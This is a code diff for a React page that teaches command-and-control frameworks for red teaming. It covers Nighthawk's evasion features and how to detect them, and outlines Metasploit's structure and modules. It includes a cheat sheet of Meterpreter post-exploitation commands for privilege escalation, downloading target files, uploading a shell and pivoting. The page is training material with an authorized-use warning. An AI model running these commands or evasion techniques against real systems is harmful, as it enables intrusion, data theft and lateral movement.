+| Call stack spoof | Arsenal Kit | Yes | Advanced |
+| ETW bypass | Malleable | Yes | Comprehensive |
+| Memory encryption | Basic | Yes | Extensive |
+| Module stomping | No | Partial | Yes |
+
+### Advanced Protections
+- Kernel callback awareness
+- Hardware breakpoint detection
+- Anti-debugging techniques
+- VM/sandbox detection (optional)
+- Anti-forensics capabilities
+
+## Detection Considerations
+
+### Why Nighthawk Is Difficult to Detect
+- Minimal to no userland API calls that EDRs hook
+- Encrypted in-memory footprint during sleep
+- Legitimate-looking call stacks defeat heuristics
+- Traffic blends with normal HTTPS/DNS
+
+### Detection Strategies That Can Work
+1. **Kernel-level telemetry**: ETW-Ti (Threat Intelligence provider)
+2. **Hardware events**: CPU performance counter monitoring
+3. **Network behavioral analysis**: Long-term beaconing patterns
+4. **Memory forensics**: During active execution windows
+5. **Behavioral analytics**: Process behavior over extended time
+
+### Security Vendor Research
+Major security vendors periodically publish detection research:
+- Memory signature analysis (when active)
+- Network traffic pattern identification
+- Behavioral indicators and heuristics
+- Loader/dropper artifact analysis
+
+## Access & Licensing
+
+### Requirements for Purchase
+- Commercial license (pricing not public, reportedly $10,000+/year)
+- Organization verification process
+- Legitimate business use case required
+- Likely background/reference checks
+- Restricted geographical availability
+
+### Target Market
+- Enterprise red teams at mature organizations
+- Advanced security consultancies
+- Government-sanctioned offensive operations
+- Organizations with genuine need for EDR bypass testing
+
+## Learning Resources
+
+- **Official Site**: https://www.mdsec.co.uk/nighthawk/
+- **MDSec Blog**: Occasional technical articles and research
+- **Security Research Papers**: Vendor detection reports
+- **Threat Intelligence**: Reports analyzing in-the-wild usage
+- **Licensed Documentation**: Comprehensive docs for customers
+
+**Note**: Due to its commercial nature and controlled distribution, detailed tutorials, technical documentation, and operational guides are only available to verified licensed users through MDSec's customer portal.
+
+## Comparison Summary
+
+### When to Choose Nighthawk Over Alternatives
+
+| Scenario | Recommendation |
+|----------|----------------|
+| Budget-conscious | Sliver, Mythic (free) |
+| Learning C2 | Metasploit, Sliver |
+| EDR bypass required | Nighthawk, Brute Ratel |
+| Maximum stealth | Nighthawk |
+| Mature red team | Nighthawk, Cobalt Strike |
+| Cross-platform needs | Sliver, Mythic |
+    `,
     features: ["Advanced evasion", "Customizable profiles", "In-memory execution", "Process injection", "Syscall obfuscation", "Sleep obfuscation", "ETW patching", "Callback masking"],
     protocols: ["HTTP/HTTPS", "DNS", "SMB"],
     difficulty: "Advanced",
@@ -222,6 +2034,16 @@ const c2Frameworks = [
     url: "https://www.mdsec.co.uk/nighthawk/",
     useCases: ["High-security environments", "Advanced adversary simulation", "Mature red teams"],
     limitations: ["Very expensive", "Restricted access", "Limited public information"],
+    versionHistory: [
+      { version: "Current", date: "2023-2024", highlights: "Continuous evasion updates, new techniques" },
+      { version: "Previous", date: "2021-2022", highlights: "Initial market presence" },
+    ],
+    communityResources: [
+      "Licensed user forums (private)",
+      "MDSec support channels",
+      "Private training offerings",
+      "Customer Slack/Discord",
+    ],
   },
 ];
 
@@ -1877,43 +3699,78 @@ const CodeBlock = ({ children, language }: { children: string; language?: string
 export default function C2FrameworksGuidePage() {
   const theme = useTheme();
   const navigate = useNavigate();
-  const [activeTab, setActiveTab] = useState(0);
 
   // Navigation state
   const [navDrawerOpen, setNavDrawerOpen] = useState(false);
+  const [activeSection, setActiveSection] = useState("overview");
   const isMobile = useMediaQuery(theme.breakpoints.down("md"));
 
   const accent = "#dc2626"; // Red accent color for C2 theme
 
-  const tabs = [
-    { label: "Overview", icon: <SettingsRemoteIcon /> },
-    { label: "Frameworks", icon: <BuildIcon /> },
-    { label: "Protocols", icon: <NetworkCheckIcon /> },
-    { label: "Infrastructure", icon: <CloudIcon /> },
-    { label: "OPSEC", icon: <VisibilityOffIcon /> },
-    { label: "Detection", icon: <ShieldIcon /> },
-    { label: "Resources", icon: <SchoolIcon /> },
+  // Section navigation items with frameworks as sub-items
+  const sectionNavItems = [
+    { id: "overview", label: "Overview", icon: <SettingsRemoteIcon /> },
+    { id: "frameworks", label: "Frameworks", icon: <BuildIcon /> },
+    { id: "fw-cobalt-strike", label: "Cobalt Strike", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-sliver", label: "Sliver", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-havoc", label: "Havoc", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-mythic", label: "Mythic", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-covenant", label: "Covenant", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-brute-ratel", label: "Brute Ratel C4", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-metasploit", label: "Metasploit", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-empire", label: "Empire/Starkiller", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "fw-poshc2", label: "PoshC2", icon: <SettingsRemoteIcon />, indent: true },
+    { id: "protocols", label: "Protocols", icon: <NetworkCheckIcon /> },
+    { id: "infrastructure", label: "Infrastructure", icon: <CloudIcon /> },
+    { id: "opsec", label: "OPSEC", icon: <VisibilityOffIcon /> },
+    { id: "detection", label: "Detection", icon: <ShieldIcon /> },
+    { id: "resources", label: "Resources", icon: <SchoolIcon /> },
+    { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
   ];
 
-  // Section navigation items (matches tabs)
-  const sectionNavItems = tabs.map((tab, index) => ({
-    id: index,
-    label: tab.label,
-    icon: tab.icon,
-  }));
-
-  // Navigate to section (switch tab)
-  const navigateToSection = (index: number) => {
-    setActiveTab(index);
-    setNavDrawerOpen(false);
-    window.scrollTo({ top: 0, behavior: "smooth" });
+  // Scroll to section
+  const scrollToSection = (sectionId: string) => {
+    const element = document.getElementById(sectionId);
+    if (element) {
+      element.scrollIntoView({ behavior: "smooth", block: "start" });
+      setActiveSection(sectionId);
+      setNavDrawerOpen(false);
+    }
   };
+
+  // Track active section on scroll
+  useEffect(() => {
+    const handleScroll = () => {
+      const sections = sectionNavItems.map(item => document.getElementById(item.id));
+      const scrollPosition = window.scrollY + 150;
+      
+      for (let i = sections.length - 1; i >= 0; i--) {
+        const section = sections[i];
+        if (section && section.offsetTop <= scrollPosition) {
+          setActiveSection(sectionNavItems[i].id);
+          break;
+        }
+      }
+    };
+    
+    window.addEventListener("scroll", handleScroll);
+    return () => window.removeEventListener("scroll", handleScroll);
+  }, []);
 
   // Scroll to top
   const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });
 
-  // Progress calculation
-  const progressPercent = ((activeTab + 1) / tabs.length) * 100;
+  // Progress calculation based on scroll
+  const [progressPercent, setProgressPercent] = useState(0);
+  useEffect(() => {
+    const handleProgress = () => {
+      const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const progress = totalHeight > 0 ? (window.scrollY / totalHeight) * 100 : 0;
+      setProgressPercent(progress);
+    };
+    window.addEventListener("scroll", handleProgress);
+    return () => window.removeEventListener("scroll", handleProgress);
+  }, []);
 
   const pageContext = `This page covers command and control (C2) frameworks for adversary simulation and red team operations. Topics include popular C2 platforms, payload generation, communication channels, evasion techniques, OPSEC considerations, detection methods, and defensive strategies.`;
 
@@ -1977,28 +3834,30 @@ export default function C2FrameworksGuidePage() {
           {sectionNavItems.map((item) => (
             <ListItem
               key={item.id}
-              onClick={() => navigateToSection(item.id)}
+              onClick={() => scrollToSection(item.id)}
               sx={{
                 borderRadius: 1.5,
                 mb: 0.25,
-                py: 0.5,
+                py: item.indent ? 0.25 : 0.5,
+                pl: item.indent ? 3 : 1,
                 cursor: "pointer",
-                bgcolor: activeTab === item.id ? alpha(accent, 0.15) : "transparent",
-                borderLeft: activeTab === item.id ? `3px solid ${accent}` : "3px solid transparent",
+                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
+                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                 "&:hover": {
                   bgcolor: alpha(accent, 0.08),
                 },
                 transition: "all 0.15s ease",
               }}
             >
-              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
+              <ListItemIcon sx={{ minWidth: item.indent ? 20 : 24, fontSize: item.indent ? "0.75rem" : "0.9rem" }}>{item.icon}</ListItemIcon>
               <ListItemText
                 primary={
                   <Typography
                     variant="caption"
                     sx={{
-                      fontWeight: activeTab === item.id ? 700 : 500,
-                      color: activeTab === item.id ? accent : "text.secondary",
+                      fontWeight: activeSection === item.id ? 700 : 500,
+                      color: activeSection === item.id ? accent : "text.secondary",
+                      fontSize: item.indent ? "0.7rem" : "0.75rem",
                     }}
                   >
                     {item.label}
@@ -2088,29 +3947,17 @@ export default function C2FrameworksGuidePage() {
         <Chip label="Advanced" size="small" variant="outlined" />
       </Box>
 
-      {/* Tabs */}
-      <Paper sx={{ mb: 3, borderRadius: 2 }}>
-        <Tabs
-          value={activeTab}
-          onChange={(_, v) => setActiveTab(v)}
-          variant="scrollable"
-          scrollButtons="auto"
-          sx={{ borderBottom: 1, borderColor: "divider" }}
-        >
-          {tabs.map((tab, idx) => (
-            <Tab key={idx} label={tab.label} icon={tab.icon} iconPosition="start" />
-          ))}
-        </Tabs>
-      </Paper>
-
-      {/* Tab 0: Overview */}
-      {activeTab === 0 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Alert severity="warning" sx={{ borderRadius: 2 }}>
-            <AlertTitle>For Authorized Testing Only</AlertTitle>
-            C2 frameworks are powerful tools for authorized red team and penetration testing engagements only.
-            Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical.
-          </Alert>
+      {/* Section: Overview */}
+      <Box id="overview" sx={{ display: "flex", flexDirection: "column", gap: 3, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <SettingsRemoteIcon sx={{ color: accent }} />
+          Overview
+        </Typography>
+        <Alert severity="warning" sx={{ borderRadius: 2 }}>
+          <AlertTitle>For Authorized Testing Only</AlertTitle>
+          C2 frameworks are powerful tools for authorized red team and penetration testing engagements only.
+          Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical.
+        </Alert>
 
           {/* Simple Introduction */}
           <Paper sx={{ p: 4, borderRadius: 2, bgcolor: alpha(theme.palette.primary.main, 0.02) }}>
@@ -2529,20 +4376,24 @@ Timeline:
             </Grid>
           </Paper>
         </Box>
-      )}
 
-      {/* Tab 1: Frameworks */}
-      {activeTab === 1 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Alert severity="info" sx={{ borderRadius: 2 }}>
-            <AlertTitle>Choosing a C2 Framework</AlertTitle>
-            Consider your operation's requirements: stealth level, target OS, team collaboration, and budget.
-            Many teams use multiple frameworks for different scenarios. Start with Sliver for learning - it's free,
-            modern, and has excellent documentation.
-          </Alert>
+      {/* Section: Frameworks */}
+      <Box id="frameworks" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <BuildIcon sx={{ color: accent }} />
+          Frameworks
+        </Typography>
+        <Alert severity="info" sx={{ borderRadius: 2 }}>
+          <AlertTitle>Choosing a C2 Framework</AlertTitle>
+          Consider your operation's requirements: stealth level, target OS, team collaboration, and budget.
+          Many teams use multiple frameworks for different scenarios. Start with Sliver for learning - it's free,
+          modern, and has excellent documentation.
+        </Alert>
 
-          {c2Frameworks.map((fw, idx) => (
-            <Accordion key={idx} defaultExpanded={idx === 0}>
+          {c2Frameworks.map((fw, idx) => {
+            const fwId = `fw-${fw.name.toLowerCase().replace(/[\s\/]+/g, '-').replace(/[^a-z0-9-]/g, '')}`;
+            return (
+            <Accordion key={idx} defaultExpanded={idx === 0} id={fwId} sx={{ scrollMarginTop: 80 }}>
               <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                   <SettingsRemoteIcon sx={{ color: fw.type === "Commercial" ? "#f59e0b" : "#10b981" }} />
@@ -2635,10 +4486,935 @@ Timeline:
                       </List>
                     </Grid>
                   )}
+
+                  {/* Deep Dive Content - Detailed Technical Information */}
+                  {fw.deepDiveContent && (
+                    <Grid item xs={12}>
+                      <Divider sx={{ my: 3 }} />
+                      <Accordion 
+                        sx={{ 
+                          bgcolor: alpha(accent, 0.03), 
+                          border: `1px solid ${alpha(accent, 0.2)}`,
+                          '&:before': { display: 'none' }
+                        }}
+                      >
+                        <AccordionSummary 
+                          expandIcon={<ExpandMoreIcon />}
+                          sx={{ 
+                            bgcolor: alpha(accent, 0.05),
+                            '&:hover': { bgcolor: alpha(accent, 0.08) }
+                          }}
+                        >
+                          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
+                            <SchoolIcon sx={{ color: accent }} />
+                            <Typography variant="h6" sx={{ fontWeight: 700 }}>
+                              📚 Deep Dive: {fw.name} Technical Guide
+                            </Typography>
+                          </Box>
+                        </AccordionSummary>
+                        <AccordionDetails sx={{ p: 3 }}>
+                          {/* Render the deep dive content with proper formatting */}
+                          <Box sx={{ 
+                            '& h2': { 
+                              fontSize: '1.3rem', 
+                              fontWeight: 700, 
+                              mt: 3, 
+                              mb: 2, 
+                              color: accent,
+                              borderBottom: `2px solid ${alpha(accent, 0.3)}`,
+                              pb: 1 
+                            },
+                            '& h3': { 
+                              fontSize: '1.1rem', 
+                              fontWeight: 600, 
+                              mt: 2, 
+                              mb: 1.5,
+                              color: 'text.primary'
+                            },
+                            '& p': { 
+                              mb: 1.5, 
+                              lineHeight: 1.7,
+                              color: 'text.secondary'
+                            },
+                            '& pre': { 
+                              bgcolor: '#1e1e1e', 
+                              color: '#d4d4d4', 
+                              p: 2, 
+                              borderRadius: 1, 
+                              overflow: 'auto',
+                              fontSize: '0.8rem',
+                              mb: 2,
+                              border: '1px solid rgba(255,255,255,0.1)'
+                            },
+                            '& code': {
+                              bgcolor: alpha(accent, 0.1),
+                              px: 0.5,
+                              borderRadius: 0.5,
+                              fontFamily: 'monospace',
+                              fontSize: '0.85em'
+                            },
+                            '& ul, & ol': { 
+                              pl: 3, 
+                              mb: 2 
+                            },
+                            '& li': { 
+                              mb: 0.5,
+                              color: 'text.secondary'
+                            },
+                            '& table': {
+                              width: '100%',
+                              borderCollapse: 'collapse',
+                              mb: 2,
+                              '& th, & td': {
+                                border: '1px solid',
+                                borderColor: 'divider',
+                                p: 1,
+                                textAlign: 'left',
+                                fontSize: '0.85rem'
+                              },
+                              '& th': {
+                                bgcolor: alpha(accent, 0.1),
+                                fontWeight: 600
+                              }
+                            },
+                            '& hr': {
+                              my: 3,
+                              borderColor: 'divider'
+                            }
+                          }}>
+                            {/* Split content by sections and render */}
+                            {fw.deepDiveContent.split('\n').map((line, lineIdx) => {
+                              // Headers
+                              if (line.startsWith('## ')) {
+                                return <Typography key={lineIdx} component="h2" sx={{ fontSize: '1.3rem', fontWeight: 700, mt: 3, mb: 2, color: accent, borderBottom: `2px solid ${alpha(accent, 0.3)}`, pb: 1 }}>{line.replace('## ', '')}</Typography>;
+                              }
+                              if (line.startsWith('### ')) {
+                                return <Typography key={lineIdx} component="h3" sx={{ fontSize: '1.1rem', fontWeight: 600, mt: 2, mb: 1.5 }}>{line.replace('### ', '')}</Typography>;
+                              }
+                              // Code blocks - detect start
+                              if (line.trim().startsWith('```')) {
+                                return null; // Skip code fence markers (handled by pre below)
+                              }
+                              // Tables - basic support
+                              if (line.includes('|') && line.trim().startsWith('|')) {
+                                const cells = line.split('|').filter(c => c.trim());
+                                if (cells.length > 0 && !line.includes('---')) {
+                                  return (
+                                    <Box key={lineIdx} sx={{ display: 'flex', borderBottom: '1px solid', borderColor: 'divider' }}>
+                                      {cells.map((cell, cellIdx) => (
+                                        <Box key={cellIdx} sx={{ flex: 1, p: 1, fontSize: '0.85rem', bgcolor: lineIdx < 3 ? alpha(accent, 0.05) : 'transparent' }}>
+                                          {cell.trim()}
+                                        </Box>
+                                      ))}
+                                    </Box>
+                                  );
+                                }
+                                return null;
+                              }
+                              // Regular paragraphs (non-empty lines that aren't special)
+                              if (line.trim() && !line.trim().startsWith('-') && !line.trim().startsWith('*') && !line.trim().startsWith('#')) {
+                                // Check if it's part of a code block by looking for surrounding context
+                                return <Typography key={lineIdx} variant="body2" sx={{ mb: 1, lineHeight: 1.7, color: 'text.secondary' }}>{line}</Typography>;
+                              }
+                              // List items
+                              if (line.trim().startsWith('- ') || line.trim().startsWith('* ')) {
+                                return (
+                                  <Box key={lineIdx} sx={{ display: 'flex', alignItems: 'flex-start', mb: 0.5, pl: 2 }}>
+                                    <Typography sx={{ mr: 1, color: accent }}>•</Typography>
+                                    <Typography variant="body2" color="text.secondary">{line.replace(/^[\s]*[-*]\s*/, '')}</Typography>
+                                  </Box>
+                                );
+                              }
+                              // Numbered lists
+                              if (/^\d+\./.test(line.trim())) {
+                                return (
+                                  <Box key={lineIdx} sx={{ display: 'flex', alignItems: 'flex-start', mb: 0.5, pl: 2 }}>
+                                    <Typography variant="body2" color="text.secondary">{line}</Typography>
+                                  </Box>
+                                );
+                              }
+                              return null;
+                            })}
+                          </Box>
+
+                          {/* Version History */}
+                          {fw.versionHistory && fw.versionHistory.length > 0 && (
+                            <Box sx={{ mt: 4 }}>
+                              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
+                                <HistoryIcon sx={{ color: accent }} />
+                                Version History
+                              </Typography>
+                              <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 2 }}>
+                                {fw.versionHistory.map((vh, vhIdx) => (
+                                  <Paper key={vhIdx} sx={{ p: 2, minWidth: 200, bgcolor: alpha(accent, 0.05), border: `1px solid ${alpha(accent, 0.2)}` }}>
+                                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent }}>{vh.version}</Typography>
+                                    <Typography variant="caption" color="text.secondary" sx={{ display: 'block', mb: 0.5 }}>{vh.date}</Typography>
+                                    <Typography variant="body2" color="text.secondary">{vh.highlights}</Typography>
+                                  </Paper>
+                                ))}
+                              </Box>
+                            </Box>
+                          )}
+
+                          {/* Community Resources */}
+                          {fw.communityResources && fw.communityResources.length > 0 && (
+                            <Box sx={{ mt: 4 }}>
+                              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
+                                <GroupsIcon sx={{ color: accent }} />
+                                Community & Resources
+                              </Typography>
+                              <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}>
+                                {fw.communityResources.map((cr, crIdx) => (
+                                  <Chip key={crIdx} label={cr} variant="outlined" size="small" sx={{ borderColor: alpha(accent, 0.3) }} />
+                                ))}
+                              </Box>
+                            </Box>
+                          )}
+                        </AccordionDetails>
+                      </Accordion>
+                    </Grid>
+                  )}
+
+                  {/* Extended Metasploit Content */}
+                  {fw.extendedContent && fw.name === "Metasploit Framework" && (
+                    <Grid item xs={12}>
+                      <Divider sx={{ my: 3 }} />
+                      
+                      {/* Architecture Overview */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <AccountTreeIcon sx={{ color: accent }} />
+                        Metasploit Architecture
+                      </Typography>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2, bgcolor: alpha(accent, 0.05), border: `1px solid ${alpha(accent, 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent, mb: 1 }}>msfconsole</Typography>
+                            <Typography variant="body2" color="text.secondary">
+                              The primary CLI interface for interacting with Metasploit. Provides access to all modules, session management, and framework configuration. Supports tab completion, history, and resource scripts.
+                            </Typography>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#10b981", 0.05), border: `1px solid ${alpha("#10b981", 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#10b981", mb: 1 }}>msfvenom</Typography>
+                            <Typography variant="body2" color="text.secondary">
+                              Standalone payload generator combining msfpayload and msfencode. Creates custom payloads in various formats (exe, dll, elf, raw, etc.) with encoder support for basic evasion.
+                            </Typography>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Database Backend</Typography>
+                            <Typography variant="body2" color="text.secondary">
+                              PostgreSQL database stores hosts, services, credentials, and loot. Enables data organization across engagements and supports workspaces for project separation.
+                            </Typography>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Module Types */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <CodeIcon sx={{ color: accent }} />
+                        Module Types
+                      </Typography>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
+                              <BugReportIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
+                              Exploit Modules (~2,500+)
+                            </Typography>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Code that takes advantage of vulnerabilities to deliver payloads. Organized by platform and service.
+                            </Typography>
+                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
+                              {["Windows SMB", "Linux Local", "Web Apps", "Remote Code Exec", "Browser Exploits", "Mobile"].map((t) => (
+                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
+                              ))}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#3b82f6" }}>
+                              <NetworkCheckIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
+                              Auxiliary Modules (~1,100+)
+                            </Typography>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Scanning, fuzzing, and information gathering without exploitation. Essential for reconnaissance.
+                            </Typography>
+                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
+                              {["Port Scanners", "Service Enum", "Credential Testing", "Fuzzers", "DoS", "Sniffers"].map((t) => (
+                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
+                              ))}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#10b981" }}>
+                              <MemoryIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
+                              Post-Exploitation Modules (~600+)
+                            </Typography>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Actions performed after gaining access. Credential harvesting, persistence, lateral movement.
+                            </Typography>
+                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
+                              {["Credential Dump", "Keylogging", "Screenshots", "Persistence", "Pivoting", "AD Attacks"].map((t) => (
+                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
+                              ))}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f59e0b" }}>
+                              <VpnKeyIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
+                              Payload Modules (~500+)
+                            </Typography>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Code that runs on the target after successful exploitation. Ranges from simple shells to advanced Meterpreter.
+                            </Typography>
+                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
+                              {["Meterpreter", "Reverse Shells", "Bind Shells", "Staged", "Stageless", "Web Shells"].map((t) => (
+                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
+                              ))}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Meterpreter Deep Dive */}
+                      <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
+                        <AlertTitle sx={{ fontWeight: 700 }}>🔥 Meterpreter (Meta-Interpreter) - The Crown Jewel</AlertTitle>
+                        <Typography variant="body2">
+                          Meterpreter is Metasploit's most powerful payload - an advanced, dynamically extensible payload that operates entirely in memory, leaving minimal forensic footprint. It's the foundation for understanding modern C2 implants.
+                        </Typography>
+                      </Alert>
+
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
+                              Meterpreter Architecture
+                            </Typography>
+                            <List dense>
+                              {[
+                                "Runs entirely in memory (no disk artifacts)",
+                                "Uses encrypted TLS communication",
+                                "Reflective DLL injection for loading",
+                                "Extensible via runtime module loading",
+                                "Supports multiple transport protocols",
+                                "Session migration between processes",
+                                "Timestomping and anti-forensics"
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0.25 }}>
+                                  <ListItemIcon sx={{ minWidth: 20 }}>
+                                    <CheckCircleIcon sx={{ fontSize: 12, color: "#8b5cf6" }} />
+                                  </ListItemIcon>
+                                  <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#ec4899", 0.05), border: `1px solid ${alpha("#ec4899", 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ec4899", mb: 1 }}>
+                              Meterpreter Variants
+                            </Typography>
+                            <List dense>
+                              {[
+                                { name: "windows/meterpreter", desc: "Standard Windows x86/x64" },
+                                { name: "windows/meterpreter_reverse_https", desc: "HTTPS encrypted comms" },
+                                { name: "linux/meterpreter", desc: "Linux ELF payload" },
+                                { name: "java/meterpreter", desc: "Cross-platform Java JAR" },
+                                { name: "python/meterpreter", desc: "Python-based for flexibility" },
+                                { name: "php/meterpreter", desc: "PHP web server payload" },
+                                { name: "android/meterpreter", desc: "Android APK payload" }
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0.25 }}>
+                                  <ListItemText 
+                                    primary={item.name} 
+                                    secondary={item.desc}
+                                    primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.75rem", color: "#ec4899" }} 
+                                    secondaryTypographyProps={{ variant: "caption", fontSize: "0.7rem" }}
+                                  />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Essential Meterpreter Commands */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <TerminalIcon sx={{ color: accent }} />
+                        Essential Meterpreter Commands
+                      </Typography>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#06b6d4" }}>
+                              System Information
+                            </Typography>
+                            <Box component="pre" sx={{ 
+                              bgcolor: "#1e1e1e", 
+                              color: "#d4d4d4", 
+                              p: 1.5, 
+                              borderRadius: 1, 
+                              fontSize: "0.7rem",
+                              overflow: "auto"
+                            }}>
+{`meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getpid
+meterpreter > ps
+meterpreter > getprivs
+meterpreter > getsystem`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f97316" }}>
+                              File System Operations
+                            </Typography>
+                            <Box component="pre" sx={{ 
+                              bgcolor: "#1e1e1e", 
+                              color: "#d4d4d4", 
+                              p: 1.5, 
+                              borderRadius: 1, 
+                              fontSize: "0.7rem",
+                              overflow: "auto"
+                            }}>
+{`meterpreter > pwd
+meterpreter > ls
+meterpreter > cd C:\\Users
+meterpreter > download secrets.txt
+meterpreter > upload shell.exe
+meterpreter > search -f *.docx`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#a855f7" }}>
+                              Network Operations
+                            </Typography>
+                            <Box component="pre" sx={{ 
+                              bgcolor: "#1e1e1e", 
+                              color: "#d4d4d4", 
+                              p: 1.5, 
+                              borderRadius: 1, 
+                              fontSize: "0.7rem",
+                              overflow: "auto"
+                            }}>
+{`meterpreter > ipconfig
+meterpreter > netstat
+meterpreter > arp
+meterpreter > route
+meterpreter > portfwd add -l 3389 \\
+              -p 3389 -r 10.0.0.5
+meterpreter > run autoroute -s 10.0.0.0/24`}
+                            </Box>
+                          </Paper>
+                        </Grid>
